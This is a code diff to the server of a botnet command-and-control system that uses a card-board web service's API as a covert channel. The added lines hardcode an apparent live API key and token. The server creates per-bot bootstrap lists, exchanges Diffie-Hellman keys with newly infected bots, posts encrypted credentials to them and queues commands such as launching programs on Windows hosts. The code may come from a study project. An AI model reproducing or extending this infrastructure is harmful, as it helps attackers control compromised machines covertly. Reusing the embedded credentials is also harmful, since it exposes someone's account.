@@ -5,6 +5,8 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import dh
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 
+BOOTSTRAP_KEY = '1e3b5351487a6af8314ecf2547fb7ce5'
+BOOTSTRAP_TOKEN = 'ATTA7f6aa6cfecd14a8a7e81d990d37a15ea9dc35a8838d58e9b6b26f17fc1e8a96460BB1D97'
 NEW_CREDS_FILE = "new_creds.json"
 USED_CREDS_FILE = "used_creds.json"
 available_bots_credential = []
@@ -14,10 +16,11 @@ malware_ids_used = []
 executing_command_ids_per_bot = {}
 finished_command_ids_per_bot = {}
 commands = {'1': "print hello1",
-            '2': "run C:\\Windows\\System32\\calc.exe", '3': "print hello2"}
+            '2': "run C:\\Windows\\System32\\calc.exe",
+            '3': "print hello2"}
 
 
-def initialize_new_bot(bootstrap_list_id, bot_id):
+def initialize_new_bot(bot_bootstrap_list_id, bot_id):
     # get new credentials if available
     if len(available_bots_credentials) == 0:
         print("ERROR: no more credentials available")
@@ -38,15 +41,18 @@ def initialize_new_bot(bootstrap_list_id, bot_id):
 
     # post the new credentials on the bootstrap board
 
+    # create a list on the server bootstrap board
+    list_name = utils.BOOTSTRAP_LIST_NAME_PREFIX + bot_id
+    server_bootstrap_list_id = utils.create_list_and_get_id(BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, list_name, utils.SERVER_BOOTSTRAP_BOARD_ID)
     # In each credentials exchange, the server generates a new private key and a new public key.
     key = utils.exchange_keys(
-        utils.BOOTSTRAP_KEY, utils.BOOTSTRAP_TOKEN, bootstrap_list_id, is_server=True)
+        BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, server_bootstrap_list_id, bot_bootstrap_list_id)
     if key is None:
         print("ERROR: could not exchange keys")
         return
     new_creds = new_key + utils.KEY_TOKEN_SEPERATOR + new_token
     message = utils.encrypt(key, new_creds)
-    if utils.create_card(utils.BOOTSTRAP_KEY, utils.BOOTSTRAP_TOKEN, bootstrap_list_id, utils.CRED_ANS_CARD_NAME,
+    if utils.create_card(BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, server_bootstrap_list_id, utils.CRED_ANS_CARD_NAME,
                          message) < 0:
         print("ERROR: could not post credentials on bootstrap board")
         return
@@ -58,10 +64,9 @@ def initialize_new_bot(bootstrap_list_id, bot_id):
     finished_command_ids_per_bot[bot_id] = []
 
 
-# TODO in the future - add encryption
 def check_bootstrap_board():
     lists = utils.get_lists_in_board(
-        utils.BOOTSTRAP_KEY, utils.BOOTSTRAP_TOKEN, utils.BOOTSTRAP_BOARD_ID)
+        BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, utils.BOT_BOOTSTRAP_BOARD_ID)
 
     for list in lists:
         name = list['name']
@@ -70,7 +75,7 @@ def check_bootstrap_board():
             continue
         malware_ids_used.append(malware_id)
         cards = utils.get_cards_in_list(
-            utils.BOOTSTRAP_KEY, utils.BOOTSTRAP_TOKEN, list['id'])
+            BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, list['id'])
         if len(cards) == 0:
             print(
                 "ERROR: no cards in bootstrap list. Maybe it will be created later. list id: " + list['id'])
